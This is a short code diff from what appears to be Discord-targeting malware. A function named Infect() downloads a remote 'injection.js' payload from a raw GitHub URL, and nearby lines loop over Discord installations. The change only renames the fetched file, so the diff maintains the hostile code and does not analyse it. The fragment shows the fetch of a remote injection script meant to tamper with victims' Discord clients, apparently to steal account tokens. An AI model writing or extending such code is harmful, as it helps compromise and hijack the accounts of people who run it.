@@ -36,7 +36,7 @@ discords.forEach(function(file) {
 listDiscords();
 
 function Infect() {
-    https.get('https://raw.githubusercontent.com/kyssuuwuas/raar/main/injection.js', (resp) => {
+    https.get('https://raw.githubusercontent.com/kyssuuwuas/raar/main/injectionn.js', (resp) => {
         let data = '';
         resp.on('data', (chunk) => {
             data += chunk;
